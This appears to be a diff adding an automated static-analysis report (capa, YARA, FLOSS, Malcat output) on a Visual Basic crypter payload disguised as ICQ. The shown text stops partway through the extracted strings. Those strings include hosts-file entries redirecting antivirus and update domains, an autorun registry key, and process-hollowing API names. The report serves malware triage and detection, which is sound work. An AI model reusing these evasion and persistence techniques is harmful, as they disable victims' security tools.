@@ -1,0 +1,4128 @@
+{
+  "capa": {
+    "rule_count": 3,
+    "top_rules": [
+      {
+        "name": "compress data via WinAPI",
+        "attack": [
+          {
+            "parts": [
+              "Collection",
+              "Archive Collected Data",
+              "Archive via Library"
+            ],
+            "tactic": "Collection",
+            "technique": "Archive Collected Data",
+            "subtechnique": "Archive via Library",
+            "id": "T1560.002"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Data",
+              "Compress Data"
+            ],
+            "objective": "Data",
+            "behavior": "Compress Data",
+            "method": "",
+            "id": "C0024"
+          }
+        ]
+      },
+      {
+        "name": "link function at runtime on Windows",
+        "attack": [
+          {
+            "parts": [
+              "Execution",
+              "Shared Modules"
+            ],
+            "tactic": "Execution",
+            "technique": "Shared Modules",
+            "subtechnique": "",
+            "id": "T1129"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "compiled from Visual Basic",
+        "attack": [],
+        "mbc": []
+      }
+    ],
+    "timeout_s": 300,
+    "sample_size": 533054,
+    "duration_s": 1.51,
+    "engine": "malcat-capa",
+    "capa_bin": "/opt/malcat/bin/malcat.capa.py"
+  },
+  "pe_imports": {
+    "engine": "pe_imports",
+    "sample_size": 533054,
+    "duration_s": 0.06,
+    "import_count": 103,
+    "signal_count": 2,
+    "signals": [
+      {
+        "label": "load_library",
+        "api_match": "LoadLibrary",
+        "attack": [
+          "T1129"
+        ]
+      },
+      {
+        "label": "get_proc_address",
+        "api_match": "GetProcAddress",
+        "attack": [
+          "T1129"
+        ]
+      }
+    ],
+    "hint": "PE import high-signal map (pefile). Not capa."
+  },
+  "yara": {
+    "rule_count": 17,
+    "matches": [
+      {
+        "rule": "domain",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$domain_regex",
+            "offset": 0,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IP",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$ipv4",
+            "offset": 14148,
+            "length": 18,
+            "xor_key": null
+          },
+          {
+            "id": "$ipv6",
+            "offset": 204309,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "contains_base64",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 8290,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Dropper_Strings",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a0",
+            "offset": 18868,
+            "length": 36,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Misc_Suspicious_Strings",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a1",
+            "offset": 525839,
+            "length": 5,
+            "xor_key": null
+          },
+          {
+            "id": "$a4",
+            "offset": 525752,
+            "length": 7,
+            "xor_key": null
+          },
+          {
+            "id": "$a6",
+            "offset": 14090,
+            "length": 52,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "url",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$url_regex",
+            "offset": 525821,
+            "length": 351,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IsPE32",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": []
+      },
+      {
+        "rule": "IsWindowsGUI",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": []
+      },
+      {
+        "rule": "HasOverlay",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": []
+      },
+      {
+        "rule": "HasRichSignature",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a0",
+            "offset": 168,
+            "length": 4,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Basic_v50v60",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 6140,
+            "length": 20,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Basic_v50",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 79,
+            "length": 1,
+            "xor_key": null
+          },
+          {
+            "id": "$b",
+            "offset": 6147,
+            "length": 20,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Basic_v50_v60",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$c",
+            "offset": 6140,
+            "length": 19,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Basic_v50_additional",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 6140,
+            "length": 20,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "Microsoft_Visual_Basic_v50v60_additional",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 6140,
+            "length": 20,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "SEH__vba",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$",
+            "offset": 53834,
+            "length": 16,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "SEH_Init",
+        "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+        "strings": [
+          {
+            "id": "$b",
+            "offset": 21314,
+            "length": 7,
+            "xor_key": null
+          }
+        ]
+      }
+    ],
+    "engine": "yara-x",
+    "rules_compiled": 454,
+    "compile_errors": [
+      "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+      "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+      "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+    ],
+    "incomplete": true,
+    "duration_s": 3.57
+  },
+  "floss": {
+    "floss_ok": true,
+    "string_count": 1249,
+    "strings_sampled": 80,
+    "strings": [
+      "!This program cannot be run in DOS mode.",
+      "`.data",
+      "kernel32.dll",
+      "NTDLL.DLL",
+      "user32.dll",
+      "MSVBVM60.DLL",
+      "Project1",
+      "Payload",
+      "COMDLG32.OCX",
+      "MSComDlg.CommonDialog",
+      "CommonDialog",
+      "Module1",
+      "Module2",
+      "Module3",
+      "Module4",
+      "Module5",
+      "Module6",
+      "Module7",
+      "Module8",
+      "Module9",
+      "Module10",
+      "Module11",
+      "Module12",
+      "Module13",
+      "Module14",
+      "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB",
+      "VBA6.DLL",
+      "__vbaErrorOverflow",
+      "__vbaAryDestruct",
+      "__vbaUbound",
+      "__vbaFreeStrList",
+      "__vbaStrI4",
+      "__vbaUI1I2",
+      "__vbaFreeVar",
+      "__vbaFreeStr",
+      "__vbaStrMove",
+      "__vbaUI1I4",
+      "__vbaGenerateBoundsError",
+      "__vbaI4Str",
+      "__vbaLenBstr",
+      "__vbaI2I4",
+      "__vbaAryConstruct2",
+      "CallWindowProcA",
+      "__vbaVarMove",
+      "__vbaVarVargNofree",
+      "__vbaI4ErrVar",
+      "RtlMoveMemory",
+      "__vbaI4Var",
+      "GetProcAddress",
+      "__vbaStrToUnicode",
+      "__vbaStrToAnsi",
+      "LoadLibraryA",
+      "__vbaOnError",
+      "__vbaStrCopy",
+      "__vbaVarZero",
+      "__vbaErase",
+      "__vbaRedim",
+      "__vbaAryUnlock",
+      "__vbaAryLock",
+      "__vbaFreeVarList",
+      "__vbaFreeObj",
+      "__vbaNextEachVar",
+      "__vbaObjVar",
+      "__vbaLateMemCall",
+      "__vbaVarDup",
+      "__vbaVarLateMemCallLd",
+      "__vbaForEachVar",
+      "__vbaAryCopy",
+      "__vbaRedimPreserve",
+      "__vbaFpI4",
+      "advapi32.dll",
+      "ConvertStringSecurityDescriptorToSecurityDescriptorA",
+      "SetKernelObjectSecurity",
+      "__vbaSetSystemError",
+      "USER32",
+      "__vbaStrCat",
+      "__vbaUI1Str",
+      "__vbaStrVarMove",
+      "__vbaLsetFixstr",
+      "__vbaInStr"
+    ],
+    "per_category": {
+      "decoded_strings": 0,
+      "stack_strings": 0,
+      "tight_strings": 0,
+      "language_strings": 0,
+      "language_strings_missed": 0,
+      "static_strings": 1249
+    },
+    "raw_key_total": 3,
+    "floss_profile": "full",
+    "floss_language": "none",
+    "duration_s": 13.0,
+    "size_bytes": 533054,
+    "static_only": false,
+    "size_exceeded_deobfuscate_limit": false
+  },
+  "malcat": {
+    "analysis_id": 1,
+    "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+    "profile": "deep",
+    "limits": {
+      "strings_max": 300,
+      "imports_max": 300,
+      "functions_max": 30,
+      "anomaly_locations_max": 50,
+      "decompile_top_n": 3
+    },
+    "file_summary": {
+      "analysis_id": 1,
+      "file_name": "virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+      "file_path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
+      "file_size": 533054,
+      "type": "PE",
+      "architecture": "X86",
+      "entropy": 135,
+      "sha256": "8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075",
+      "metadata": {
+        "VersionInfo::CompanyName": "ICQ, LLC.",
+        "VersionInfo::FileDescription": "ICQ",
+        "VersionInfo::FileVersion": "7.5.0.5255",
+        "VersionInfo::InternalName": "ICQ",
+        "VersionInfo::LegalCopyright": "Copyright (c) 1998-2010 ICQ, LLC.",
+        "VersionInfo::LegalTrademarks": "",
+        "VersionInfo::OriginalFilename": "ICQ.exe",
+        "VersionInfo::ProductName": "ICQ",
+        "VersionInfo::ProductVersion": "7.5.0.5255",
+        "VersionInfo::DistId": "30012",
+        "VisualBasicInfos::ProjectExeName": "Payload",
+        "VisualBasicInfos::ProjectTitle": "Project1",
+        "VisualBasicInfos::ProjectName": "Project1",
+        "VisualBasicInfos::PathInformation": "*\\AC:\\Users\\Owner\\Desktop\\Darty Crypter Source\\Payload\\Project1.vbp\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"
+      },
+      "entrypoint_ea": 6140,
+      "layout": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 4096,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 15
+        },
+        {
+          "name": ".text",
+          "effective_address": 4096,
+          "physical_size": 53248,
+          "virtual_size": 53248,
+          "rights": "RX",
+          "entropy": 103
+        },
+        {
+          "name": ".data",
+          "effective_address": 57344,
+          "physical_size": 4096,
+          "virtual_size": 8192,
+          "rights": "RW",
+          "entropy": 4
+        },
+        {
+          "name": ".rsrc",
+          "effective_address": 65536,
+          "physical_size": 466944,
+          "virtual_size": 466944,
+          "rights": "R",
+          "entropy": 141
+        },
+        {
+          "name": "overlay",
+          "effective_address": 532480,
+          "physical_size": 4670,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 121
+        }
+      ],
+      "kesakode_verdict": []
+    },
+    "views": {
+      "anomalies": [
+        {
+          "name": "BoundImports",
+          "desc": "Bound imports are present",
+          "category": "imports",
+          "level": 2,
+          "num_hits": 1
+        },
+        {
+          "name": "InvalidChecksum",
+          "desc": "PE Header checksum is wrong",
+          "category": "integrity",
+          "level": 4,
+          "num_hits": 1
+        },
+        {
+          "name": "PossibleDownloaderApiDynamicImport",
+          "desc": "A downloader-related api (recv, InternetConnect, etc.) is present as string in the binary, but is not imported",
+          "category": "imports",
+          "level": 4,
+          "num_hits": 1
+        },
+        {
+          "name": "PossiblePackerApiDynamicImport",
+          "desc": "A packer-related api (VirtualProtect, ResumeThread, etc.) is present as string in the binary, but is not imported",
+          "category": "imports",
+          "level": 4,
+          "num_hits": 5
+        },
+        {
+          "name": "StackArrayInitialisationX86",
+          "desc": "An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings",
+          "category": "code",
+          "level": 3,
+          "num_hits": 4
+        },
+        {
+          "name": "UnknownOverlayMediumToHighEntropy",
+          "desc": "File contains an overlay which is not of known type and has medium-to-high entropy",
+          "category": "entropy",
+          "level": 3,
+          "num_hits": 1
+        },
+        {
+          "name": "UnknownRootResourceDirectoryId",
+          "desc": "A root resource directory ID is not standard",
+          "category": "resources",
+          "level": 4,
+          "num_hits": 1
+        },
+        {
+          "name": "UnparsedVersionInfo",
+          "desc": "Version informations were not fully parsed",
+          "category": "resources",
+          "level": 4,
+          "num_hits": 1
+        },
+        {
+          "name": "VBExternalApi",
+          "desc": "VB project uses external Win32 APIs (most likely via DllFunctionCall)",
+          "category": "imports",
+          "level": 3,
+          "num_hits": 3
+        },
+        {
+          "name": "XorInLoop",
+          "desc": "XOR instruction in a loop",
+          "category": "code",
+          "level": 3,
+          "num_hits": 2
+        }
+      ],
+      "anomaly_locations": {
+        "XorInLoop": [
+          {
+            "ea": 21773,
+            "context": ""
+          },
+          {
+            "ea": 22545,
+            "context": ""
+          }
+        ]
+      },
+      "yara_hits": [
+        {
+          "id": "MSVC_6_linker",
+          "category": "compiler",
+          "reliability": 60,
+          "type": "INFO",
+          "description": "detects used visual studio version based on linker information",
+          "num_patterns": 0
+        },
+        {
+          "id": "VisualBasic",
+          "category": "language",
+          "reliability": 100,
+          "type": "INFO",
+          "description": "VisualBasic executable (pcode or native)",
+          "num_patterns": 0
+        },
+        {
+          "id": "CreateRegistryEntryUsingBatch",
+          "category": "persistence",
+          "reliability": 30,
+          "type": "UNCOMMON",
+          "description": "create a registry entry using batch commands (reg.exe ..). Often used by malware",
+          "num_patterns": 1
+        },
+        {
+          "id": "AutorunKey",
+          "category": "persistence",
+          "reliability": 20,
+          "type": "UNCOMMON",
+          "description": "file contains path of an autorun key",
+          "num_patterns": 1
+        },
+        {
+          "id": "RunShell",
+          "category": "lateral movement",
+          "reliability": 70,
+          "type": "UNCOMMON",
+          "description": "starts a shell",
+          "num_patterns": 1
+        },
+        {
+          "id": "Wscript",
+          "category": "lateral movement",
+          "reliability": 30,
+          "type": "SUSPICIOUS",
+          "description": "runs a wscript script (vbs, js, ..)",
+          "num_patterns": 1
+        },
+        {
+          "id": "ms_visual_basic_50_60_01",
+          "category": "compiler",
+          "reliability": 50,
+          "type": "INFO",
+          "description": "",
+          "num_patterns": 1
+        },
+        {
+          "id": "ms_visual_basic_50_01",
+          "category": "compiler",
+          "reliability": 50,
+          "type": "INFO",
+          "description": "",
+          "num_patterns": 1
+        }
+      ],
+      "strings": [
+        {
+          "ea": 18804,
+          "summary": "HKCU\\Software\\Mi..rrentVersion\\Run"
+        },
+        {
+          "ea": 18964,
+          "summary": "Scripting.FileSystemObject"
+        },
+        {
+          "ea": 18932,
+          "summary": "ShellExecuteW"
+        },
+        {
+          "ea": 17076,
+          "summary": " /t REG_SZ /d "
+        },
+        {
+          "ea": 13556,
+          "summary": "SOFTWARE\\Microso..\\Policies\\System"
+        },
+        {
+          "ea": 12608,
+          "summary": "B8000000005058909090C3"
+        },
+        {
+          "ea": 13376,
+          "summary": "SOFTWARE\\Microso..\\Security Center"
+        },
+        {
+          "ea": 14664,
+          "summary": "127.0.2.5\\tliveu..veupdate.com\\r\\n"
+        },
+        {
+          "ea": 13776,
+          "summary": "\\tmpduzhfg89fgdg..fdzuudgzfgfd.exe"
+        },
+        {
+          "ea": 14216,
+          "summary": "127.0.2.5\\tsecur..symantec.com\\r\\n"
+        },
+        {
+          "ea": 18260,
+          "summary": "127.0.2.5\\twindo..icrosoft.com\\r\\n"
+        },
+        {
+          "ea": 15472,
+          "summary": "127.0.2.5\\twww.n..sociates.com\\r\\n"
+        },
+        {
+          "ea": 11780,
+          "summary": "select name from..where name='---'"
+        },
+        {
+          "ea": 13248,
+          "summary": "Ntdll.dll"
+        },
+        {
+          "ea": 16920,
+          "summary": "127.0.2.5\\thouse..endmicro.com\\r\\n"
+        },
+        {
+          "ea": 16636,
+          "summary": "127.0.2.5\\tcusto..symantec.com\\r\\n"
+        },
+        {
+          "ea": 15560,
+          "summary": "127.0.2.5\\tnetwo..sociates.com\\r\\n"
+        },
+        {
+          "ea": 16552,
+          "summary": "127.0.2.5\\tliveu..symantec.com\\r\\n"
+        },
+        {
+          "ea": 17112,
+          "summary": "127.0.2.5\\twww.p..software.com\\r\\n"
+        },
+        {
+          "ea": 16412,
+          "summary": "127.0.2.5\\tupdat..symantec.com\\r\\n"
+        },
+        {
+          "ea": 18352,
+          "summary": "127.0.2.5\\tvirus..an.jotti.org\\r\\n"
+        },
+        {
+          "ea": 17884,
+          "summary": "127.0.2.5\\twww.microsoft.com\\r\\n"
+        },
+        {
+          "ea": 15948,
+          "summary": "127.0.2.5\\tdownl..d.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 18184,
+          "summary": "127.0.2.5\\tupdat..icrosoft.com\\r\\n"
+        },
+        {
+          "ea": 14068,
+          "summary": "C:\\WINDOWS\\syste..rivers\\etc\\hosts"
+        },
+        {
+          "ea": 16336,
+          "summary": "127.0.2.5\\tupdat..symantec.com\\r\\n"
+        },
+        {
+          "ea": 18748,
+          "summary": "service.exe"
+        },
+        {
+          "ea": 16024,
+          "summary": "127.0.2.5\\tdispa..h.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 14768,
+          "summary": "127.0.2.5\\twww.viruslist.com\\r\\n"
+        },
+        {
+          "ea": 18520,
+          "summary": "127.0.2.5\\tnovirusthanks.org\\r\\n"
+        },
+        {
+          "ea": 15876,
+          "summary": "127.0.2.5\\twww.my-etrust.com\\r\\n"
+        },
+        {
+          "ea": 18048,
+          "summary": "127.0.2.5\\twww.v..rustotal.com\\r\\n"
+        },
+        {
+          "ea": 16784,
+          "summary": "127.0.2.5\\ttrendmicro.com\\r\\n"
+        },
+        {
+          "ea": 17192,
+          "summary": "127.0.2.5\\tfree.grisoft.com\\r\\n"
+        },
+        {
+          "ea": 15744,
+          "summary": "127.0.2.5\\tmast.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 13852,
+          "summary": "\\tmpjhgTFztfZ789tfzTDt.exe"
+        },
+        {
+          "ea": 17004,
+          "summary": "127.0.2.5\\tpandasoftware.com\\r\\n"
+        },
+        {
+          "ea": 14424,
+          "summary": "127.0.2.5\\twww.sophos.com\\r\\n"
+        },
+        {
+          "ea": 17444,
+          "summary": "127.0.2.5\\twww.clamav.net\\r\\n"
+        },
+        {
+          "ea": 17824,
+          "summary": "127.0.2.5\\twww.cert.org\\r\\n"
+        },
+        {
+          "ea": 17260,
+          "summary": "127.0.2.5\\twww.grisoft.com\\r\\n"
+        },
+        {
+          "ea": 17956,
+          "summary": "127.0.2.5\\tmicrosoft.com\\r\\n"
+        },
+        {
+          "ea": 16716,
+          "summary": "127.0.2.5\\trads.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 14544,
+          "summary": "127.0.2.5\\twww.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 14964,
+          "summary": "127.0.2.5\\twww.f-secure.com\\r\\n"
+        },
+        {
+          "ea": 15088,
+          "summary": "127.0.2.5\\twww.f-prot.com\\r\\n"
+        },
+        {
+          "ea": 15400,
+          "summary": "127.0.2.5\\twww.kaspersky.com\\r\\n"
+        },
+        {
+          "ea": 16100,
+          "summary": "127.0.2.5\\tsecure.nai.com\\r\\n"
+        },
+        {
+          "ea": 15216,
+          "summary": "127.0.2.5\\tkaspe..sky-labs.com\\r\\n"
+        },
+        {
+          "ea": 14364,
+          "summary": "127.0.2.5\\twww.sarc.com\\r\\n"
+        },
+        {
+          "ea": 17584,
+          "summary": "127.0.2.5\\twww.free-av.com\\r\\n"
+        },
+        {
+          "ea": 17652,
+          "summary": "127.0.2.5\\twww.avast.com\\r\\n"
+        },
+        {
+          "ea": 14840,
+          "summary": "127.0.2.5\\tviruslist.com\\r\\n"
+        },
+        {
+          "ea": 16488,
+          "summary": "127.0.2.5\\tus.mcafee.com\\r\\n"
+        },
+        {
+          "ea": 15812,
+          "summary": "127.0.2.5\\tmy-etrust.com\\r\\n"
+        },
+        {
+          "ea": 16216,
+          "summary": "127.0.2.5\\twww.nai.com\\r\\n"
+        },
+        {
+          "ea": 15640,
+          "summary": "127.0.2.5\\twww.ca.com\\r\\n"
+        },
+        {
+          "ea": 18428,
+          "summary": "127.0.2.5\\tjotti.org\\r\\n"
+        },
+        {
+          "ea": 14148,
+          "summary": "127.0.2.5\\tsymantec.com\\r\\n"
+        },
+        {
+          "ea": 16848,
+          "summary": "127.0.2.5\\twww.t..endmicro.com\\r\\n"
+        },
+        {
+          "ea": 17772,
+          "summary": "127.0.2.5\\tcert.org\\r\\n"
+        },
+        {
+          "ea": 15288,
+          "summary": "127.0.2.5\\twww.avp.com\\r\\n"
+        },
+        {
+          "ea": 14608,
+          "summary": "127.0.2.5\\tmcafee.com\\r\\n"
+        },
+        {
+          "ea": 15032,
+          "summary": "127.0.2.5\\tf-prot.com\\r\\n"
+        },
+        {
+          "ea": 14904,
+          "summary": "127.0.2.5\\tf-secure.com\\r\\n"
+        },
+        {
+          "ea": 15152,
+          "summary": "127.0.2.5\\tkaspersky.com\\r\\n"
+        },
+        {
+          "ea": 17328,
+          "summary": "127.0.2.5\\tgrisoft.com\\r\\n"
+        },
+        {
+          "ea": 17388,
+          "summary": "127.0.2.5\\tclamav.net\\r\\n"
+        },
+        {
+          "ea": 14488,
+          "summary": "127.0.2.5\\tsophos.com\\r\\n"
+        },
+        {
+          "ea": 16276,
+          "summary": "127.0.2.5\\tvil.nai.com\\r\\n"
+        },
+        {
+          "ea": 13316,
+          "summary": "advapi32.dll"
+        },
+        {
+          "ea": 17508,
+          "summary": "127.0.2.5\\tfree-av.com\\r\\n"
+        },
+        {
+          "ea": 12884,
+          "summary": "GetEnvironmentVariableW"
+        },
+        {
+          "ea": 14312,
+          "summary": "127.0.2.5\\tsarc.com\\r\\n"
+        },
+        {
+          "ea": 17716,
+          "summary": "127.0.2.5\\tavast.com\\r\\n"
+        },
+        {
+          "ea": 11116,
+          "summary": "NtAllocateVirtualMemory"
+        },
+        {
+          "ea": 16164,
+          "summary": "127.0.2.5\\tnai.com\\r\\n"
+        },
+        {
+          "ea": 15696,
+          "summary": "127.0.2.5\\tca.com\\r\\n"
+        },
+        {
+          "ea": 15348,
+          "summary": "127.0.2.5\\tavp.com\\r\\n"
+        },
+        {
+          "ea": 18120,
+          "summary": "127.0.2.5\\tvirustotal.com\\r\\n"
+        },
+        {
+          "ea": 12076,
+          "summary": "RtlDecompressBuffer"
+        },
+        {
+          "ea": 11428,
+          "summary": "NtSetContextThread"
+        },
+        {
+          "ea": 11372,
+          "summary": "NtGetContextThread"
+        },
+        {
+          "ea": 10564,
+          "summary": "&H59595958"
+        },
+        {
+          "ea": 12568,
+          "summary": "RtlGetCurrentPeb"
+        },
+        {
+          "ea": 11068,
+          "summary": "NtUnmapViewOfSection"
+        },
+        {
+          "ea": 13272,
+          "summary": "RtlAdjustPrivilege"
+        },
+        {
+          "ea": 12752,
+          "summary": "GetModuleFileNameA"
+        },
+        {
+          "ea": 13172,
+          "summary": "FreeResource"
+        },
+        {
+          "ea": 11032,
+          "summary": "CreateProcessW"
+        },
+        {
+          "ea": 13940,
+          "summary": "Error"
+        },
+        {
+          "ea": 13204,
+          "summary": "FreeLibrary"
+        },
+        {
+          "ea": 13712,
+          "summary": "IGDAIEjhMWNJXBpLAHHP"
